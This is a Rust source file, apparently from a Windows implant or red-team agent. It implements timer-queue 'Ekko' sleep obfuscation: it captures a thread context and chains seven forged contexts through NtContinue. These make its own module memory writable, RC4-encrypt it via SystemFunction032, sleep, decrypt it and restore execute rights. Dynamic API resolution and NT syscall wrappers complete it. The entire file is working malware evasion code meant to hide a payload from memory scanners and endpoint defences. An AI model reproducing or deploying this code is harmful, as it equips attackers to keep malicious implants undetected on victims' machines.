//!
//!
//!

use core::ffi::c_void;

use crate::ffi::{wide, GetModuleHandleW, GetProcAddress};
use crate::invoke::{
    nt_close, nt_create_event, nt_set_event, nt_signal_and_wait_for_single_object,
};
use crate::pe::PeImage;

const CONTEXT_FULL: u32 = 0x0010_0007;
const WT_EXECUTEINTIMERTHREAD: u32 = 0x0000_0020;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const EVENT_ALL_ACCESS: u32 = 0x1F_0003;
const NOTIFICATION_EVENT: u32 = 0;
const INFINITE: u32 = 0xFFFF_FFFF;
const NEG_ONE_HANDLE: usize = usize::MAX;

#[repr(C, align(16))]
#[derive(Clone, Copy)]
pub struct Context {
    pub p1_home: u64,
    pub p2_home: u64,
    pub p3_home: u64,
    pub p4_home: u64,
    pub p5_home: u64,
    pub p6_home: u64,
    pub context_flags: u32,
    pub mx_csr: u32,
    pub seg_cs: u16,
    pub seg_ds: u16,
    pub seg_es: u16,
    pub seg_fs: u16,
    pub seg_gs: u16,
    pub seg_ss: u16,
    pub e_flags: u32,
    pub dr0: u64,
    pub dr1: u64,
    pub dr2: u64,
    pub dr3: u64,
    pub dr6: u64,
    pub dr7: u64,
    pub rax: u64,
    pub rcx: u64,
    pub rdx: u64,
    pub rbx: u64,
    pub rsp: u64,
    pub rbp: u64,
    pub rsi: u64,
    pub rdi: u64,
    pub r8: u64,
    pub r9: u64,
    pub r10: u64,
    pub r11: u64,
    pub r12: u64,
    pub r13: u64,
    pub r14: u64,
    pub r15: u64,
    pub rip: u64,
    pub flt_save: [u8; 512],
    pub vector_register: [u8; 416],
    pub vector_control: u64,
    pub debug_control: u64,
    pub last_branch_to_rip: u64,
    pub last_branch_from_rip: u64,
    pub last_exception_to_rip: u64,
    pub last_exception_from_rip: u64,
}

impl Context {
    pub fn zeroed() -> Self {
        unsafe { core::mem::zeroed() }
    }
}

#[repr(C)]
struct UString {
    length: u32,
    max_length: u32,
    buffer: *mut u8,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct MemBasicInfo {
    base_address: usize,
    allocation_base: usize,
    allocation_protect: u32,
    partition_id: u16,
    region_size: usize,
    state: u32,
    protect: u32,
    type_: u32,
}

type FnCaptureContext = unsafe extern "system" fn(*mut Context);
type FnNtContinue = unsafe extern "system" fn(*const Context) -> i32;
type FnCreateTimerQueue = unsafe extern "system" fn(*mut usize) -> i32;
type FnCreateTimer =
    unsafe extern "system" fn(usize, *mut usize, usize, usize, u32, u32, u32) -> i32;
type FnDeleteTimerQueue = unsafe extern "system" fn(usize) -> i32;
type FnVirtualProtect = unsafe extern "system" fn(usize, usize, u32, *mut u32) -> i32;
type FnWaitSingleEx = unsafe extern "system" fn(usize, u32, i32) -> u32;
type FnVirtualQuery = unsafe extern "system" fn(usize, *mut MemBasicInfo, usize) -> usize;
type FnSystemFunction032 = unsafe extern "system" fn(*const UString, *const UString) -> i32;

unsafe fn resolve(module: *mut c_void, name: &[u8]) -> usize {
    let mut n = name.to_vec();
    n.push(0);
    GetProcAddress(module, n.as_ptr()) as usize
}

fn fill_random(buf: &mut [u8]) {
    let lo: u32;
    let hi: u32;
    unsafe {
        core::arch::asm!("rdtsc", out("eax") lo, out("edx") hi);
    }
    let mut state = ((hi as u64) << 32) | lo as u64;
    state ^= (std::process::id() as u64) << 32;
    state ^= buf.as_ptr() as u64;

    for b in buf.iter_mut() {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        *b = state as u8;
    }
}

unsafe fn self_module_range() -> Option<(usize, usize)> {
    let here = self_module_range as *const () as usize;
    let mut mbi = core::mem::zeroed::<MemBasicInfo>();
    let queried = {
        let kernel32 = GetModuleHandleW(wide("kernel32.dll").as_ptr());
        let f: FnVirtualQuery = core::mem::transmute(resolve(kernel32, b"VirtualQuery\0"));
        f(here, &mut mbi, core::mem::size_of::<MemBasicInfo>())
    };
    if queried == 0 || mbi.allocation_base == 0 {
        return None;
    }
    let img = PeImage::parse(mbi.allocation_base)?;
    let size = img.size_of_image();
    if size == 0 {
        return None;
    }
    Some((mbi.allocation_base, size))
}

unsafe extern "system" fn set_event_cb(param: usize, _fired: u8) {
    nt_set_event(param, core::ptr::null_mut());
}

///
///
/// # Safety
pub unsafe fn obfuscated_sleep(timeout_ms: u32) -> bool {
    if timeout_ms == 0 {
        return true;
    }
    if let Ok(true) = ekko_sleep(timeout_ms) {
        return true;
    }
    std::thread::sleep(std::time::Duration::from_millis(timeout_ms as u64));
    false
}

unsafe fn ekko_sleep(timeout_ms: u32) -> Result<bool, ()> {
    let (base, size) = self_module_range().ok_or(())?;
    let img = PeImage::parse(base).ok_or(())?;
    let (text_base, text_size) = img.section_range(b".text\0\0\0").unwrap_or((base, size));

    let ntdll = GetModuleHandleW(wide("ntdll.dll").as_ptr());
    let kernel32 = GetModuleHandleW(wide("kernel32.dll").as_ptr());
    let advapi32 = GetModuleHandleW(wide("advapi32.dll").as_ptr());
    if ntdll.is_null() || kernel32.is_null() || advapi32.is_null() {
        return Err(());
    }

    let rtl_capture: FnCaptureContext =
        core::mem::transmute(resolve(ntdll, b"RtlCaptureContext\0"));
    let nt_continue: FnNtContinue = core::mem::transmute(resolve(ntdll, b"NtContinue\0"));
    let rtl_create_queue: FnCreateTimerQueue =
        core::mem::transmute(resolve(ntdll, b"RtlCreateTimerQueue\0"));
    let rtl_create_timer: FnCreateTimer = core::mem::transmute(resolve(ntdll, b"RtlCreateTimer\0"));
    let rtl_delete_queue: FnDeleteTimerQueue =
        core::mem::transmute(resolve(ntdll, b"RtlDeleteTimerQueue\0"));
    let virtual_protect: FnVirtualProtect =
        core::mem::transmute(resolve(kernel32, b"VirtualProtect\0"));
    let wait_single_ex: FnWaitSingleEx =
        core::mem::transmute(resolve(kernel32, b"WaitForSingleObjectEx\0"));
    let sys032: FnSystemFunction032 =
        core::mem::transmute(resolve(advapi32, b"SystemFunction032\0"));

    if rtl_capture as usize == 0
        || nt_continue as usize == 0
        || rtl_create_queue as usize == 0
        || rtl_create_timer as usize == 0
        || rtl_delete_queue as usize == 0
        || virtual_protect as usize == 0
        || wait_single_ex as usize == 0
        || sys032 as usize == 0
    {
        return Err(());
    }

    let mut key = [0u8; 16];
    fill_random(&mut key);
    let key_str = UString {
        length: 16,
        max_length: 16,
        buffer: key.as_mut_ptr(),
    };
    let img_str = UString {
        length: size as u32,
        max_length: size as u32,
        buffer: base as *mut u8,
    };

    let mut evt_timer = 0usize;
    let mut evt_start = 0usize;
    let mut evt_delay = 0usize;
    if nt_create_event(&mut evt_timer, EVENT_ALL_ACCESS, 0, NOTIFICATION_EVENT, 0) != 0
        || nt_create_event(&mut evt_start, EVENT_ALL_ACCESS, 0, NOTIFICATION_EVENT, 0) != 0
        || nt_create_event(&mut evt_delay, EVENT_ALL_ACCESS, 0, NOTIFICATION_EVENT, 0) != 0
    {
        return Err(());
    }

    // timer queue
    let mut queue = 0usize;
    if rtl_create_queue(&mut queue) != 0 || queue == 0 {
        nt_close(evt_timer);
        nt_close(evt_start);
        nt_close(evt_delay);
        return Err(());
    }

    let mut timer_ctx = Context::zeroed();
    timer_ctx.context_flags = CONTEXT_FULL;
    let mut timer = 0usize;
    let mut due = 100u32;
    if rtl_create_timer(
        queue,
        &mut timer,
        rtl_capture as usize,
        &mut timer_ctx as *mut _ as usize,
        due,
        0,
        WT_EXECUTEINTIMERTHREAD,
    ) != 0
    {
        rtl_delete_queue(queue);
        nt_close(evt_timer);
        nt_close(evt_start);
        nt_close(evt_delay);
        return Err(());
    }
    due += 100;

    if rtl_create_timer(
        queue,
        &mut timer,
        set_event_cb as *const () as usize,
        evt_timer as usize,
        due,
        0,
        WT_EXECUTEINTIMERTHREAD,
    ) != 0
    {
        rtl_delete_queue(queue);
        nt_close(evt_timer);
        nt_close(evt_start);
        nt_close(evt_delay);
        return Err(());
    }
    due += 100;

    if nt_wait_single(evt_timer) != 0 {
        rtl_delete_queue(queue);
        nt_close(evt_timer);
        nt_close(evt_start);
        nt_close(evt_delay);
        return Err(());
    }

    let mut old1 = 0u32;
    let mut old2 = 0u32;
    let mut rop = [timer_ctx; 7];
    for c in rop.iter_mut() {
        c.rsp = timer_ctx.rsp.wrapping_sub(8);
    }

    // [0] WaitForSingleObjectEx(evt_start, INFINITE, FALSE)
    rop[0].rip = wait_single_ex as usize as u64;
    rop[0].rcx = evt_start as u64;
    rop[0].rdx = INFINITE as u64;
    rop[0].r8 = 0;
    // [1] VirtualProtect(base, size, RW, &old1)
    rop[1].rip = virtual_protect as usize as u64;
    rop[1].rcx = base as u64;
    rop[1].rdx = size as u64;
    rop[1].r8 = PAGE_READWRITE as u64;
    rop[1].r9 = &mut old1 as *mut u32 as u64;
    rop[2].rip = sys032 as usize as u64;
    rop[2].rcx = &img_str as *const UString as u64;
    rop[2].rdx = &key_str as *const UString as u64;
    // [3] WaitForSingleObjectEx(-1, timeout, FALSE) —— sleep
    rop[3].rip = wait_single_ex as usize as u64;
    rop[3].rcx = NEG_ONE_HANDLE as u64;
    rop[3].rdx = timeout_ms as u64;
    rop[3].r8 = 0;
    rop[4].rip = sys032 as usize as u64;
    rop[4].rcx = &img_str as *const UString as u64;
    rop[4].rdx = &key_str as *const UString as u64;
    rop[5].rip = virtual_protect as usize as u64;
    rop[5].rcx = text_base as u64;
    rop[5].rdx = text_size as u64;
    rop[5].r8 = PAGE_EXECUTE_READ as u64;
    rop[5].r9 = &mut old2 as *mut u32 as u64;
    // [6] NtSetEvent(evt_delay)
    rop[6].rip = resolve(ntdll, b"NtSetEvent\0") as u64;
    rop[6].rcx = evt_delay as u64;
    rop[6].rdx = 0;

    for c in rop.iter_mut() {
        if rtl_create_timer(
            queue,
            &mut timer,
            nt_continue as usize,
            c as *mut Context as usize,
            due,
            0,
            WT_EXECUTEINTIMERTHREAD,
        ) != 0
        {
            rtl_delete_queue(queue);
            nt_close(evt_timer);
            nt_close(evt_start);
            nt_close(evt_delay);
            return Err(());
        }
        due += 100;
    }

    let status =
        nt_signal_and_wait_for_single_object(evt_start, evt_delay, 0, core::ptr::null_mut());

    rtl_delete_queue(queue);
    nt_close(evt_timer);
    nt_close(evt_start);
    nt_close(evt_delay);
    key.fill(0);

    Ok(status == 0)
}

unsafe fn nt_wait_single(handle: usize) -> i32 {
    // NtWaitForSingleObject(handle, FALSE, NULL)
    crate::invoke::nt_wait_for_single_object(handle, 0, core::ptr::null_mut())
}

#[cfg(all(test, windows))]
mod tests {
    use super::*;

    #[test]
    fn context_layout_matches_winnt() {
        assert_eq!(core::mem::size_of::<Context>(), 1232);
        assert_eq!(core::mem::offset_of!(Context, context_flags), 0x30);
        assert_eq!(core::mem::offset_of!(Context, rax), 0x78);
        assert_eq!(core::mem::offset_of!(Context, rcx), 0x80);
        assert_eq!(core::mem::offset_of!(Context, rsp), 0x98);
        assert_eq!(core::mem::offset_of!(Context, r8), 0xB8);
        assert_eq!(core::mem::offset_of!(Context, rip), 0xF8);
        assert_eq!(core::mem::offset_of!(Context, vector_control), 0x4A0);
    }
}
